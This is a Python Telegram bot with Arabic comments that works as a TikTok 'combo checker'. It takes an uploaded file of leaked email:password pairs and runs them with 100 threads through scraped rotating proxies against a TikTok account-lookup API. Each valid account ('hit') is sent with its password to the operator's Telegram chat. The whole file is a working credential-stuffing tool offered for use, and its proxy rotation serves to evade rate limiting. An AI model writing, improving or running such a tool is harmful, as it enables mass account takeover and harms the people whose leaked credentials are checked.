import os
import time
import random
import requests
import threading
import telebot
from concurrent.futures import ThreadPoolExecutor

# --- الألوان للكونسول ---
class Colors:
    G = '\033[92m'
    R = '\033[91m'
    C = '\033[96m'
    W = '\033[0m'

class Stats:
    hits = 0
    bad = 0
    checked = 0
    proxies_list = []
    is_running = False

# --- إعدادات البوت ---
TOKEN = input(f"{Colors.C}[?] Enter Bot Token: {Colors.W}").strip()
CHAT_ID = input(f"{Colors.C}[?] Enter Your Telegram ID: {Colors.W}").strip()
bot = telebot.TeleBot(TOKEN)

# --- وظيفة سحب البروكسيات ---
def scrape_proxies():
    urls = [
        "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
    ]
    Stats.proxies_list = []
    for url in urls:
        try:
            res = requests.get(url, timeout=10)
            Stats.proxies_list.extend(res.text.splitlines())
        except: continue
    print(f"{Colors.G}[+] Proxies updated: {len(Stats.proxies_list)}{Colors.W}")

# --- محرك الفحص ---
def check_tiktok(line, bot_instance, chat_id):
    if ":" not in line: return
    email, password = line.split(":", 1)
    
    url = "https://api22-normal-c-alisg.tiktokv.com/passport/account_lookup/email/"
    proxy_addr = random.choice(Stats.proxies_list) if Stats.proxies_list else None
    proxy = {"http": f"http://{proxy_addr}", "https": f"http://{proxy_addr}"} if proxy_addr else None

    params = {"email": email, "aid": "1233", "device_platform": "android", "version_code": "240504"}
    
    try:
        response = requests.get(url, params=params, proxies=proxy, timeout=5)
        data = response.json()

        if data.get("message") == "success":
            Stats.hits += 1
            print(f"{Colors.G}[HIT] {email}{Colors.W}")
            bot_instance.send_message(chat_id, f"✅ **New Hit!**\n📧 `{email}`\n🔑 `{password}`", parse_mode="Markdown")
        else:
            Stats.bad += 1
    except: pass
    finally:
        Stats.checked += 1

# --- التعامل مع الرسائل والملفات ---
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "🚀 أهلاً بك! أرسل لي ملف `combo.txt` الآن وسأبدأ الفحص مباشرة على Google Cloud.")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    if Stats.is_running:
        bot.reply_to(message, "⚠️ هناك عملية فحص جارية حالياً، يرجى الانتظار.")
        return

    if message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "⏳ جاري تحميل الكومبو وتحديث البروكسيات...")
        
        # تحميل الملف
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open("data/combo.txt", "wb") as f:
            f.write(downloaded_file)
        
        # تصفير الإحصائيات وبدء الفحص
        scrape_proxies()
        combo = open("data/combo.txt", "r").read().splitlines()
        
        bot.send_message(message.chat.id, f"✅ تم استلام {len(combo)} حساب. بدأت العملية الآن... 🚀")
        
        threading.Thread(target=run_checker, args=(combo, message.chat.id)).start()
    else:
        bot.reply_to(message, "❌ يرجى إرسال ملف نصي (.txt) فقط.")

def run_checker(combo, chat_id):
    Stats.is_running = True
    Stats.hits = 0
    Stats.bad = 0
    Stats.checked = 0
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        for line in combo:
            executor.submit(check_tiktok, line, bot, chat_id)
    
    Stats.is_running = False
    bot.send_message(chat_id, f"🏁 **انتهى الفحص!**\n✅ Hits: {Stats.hits}\n❌ Bad: {Stats.bad}\nTotal: {Stats.checked}")

# --- تشغيل البوت ---
def main():
    if not os.path.exists("data"): os.makedirs("data")
    print(f"{Colors.G}[+] Bot is alive... Waiting for combo file via Telegram.{Colors.W}")
    bot.infinity_polling()

if __name__ == "__main__":
    main()
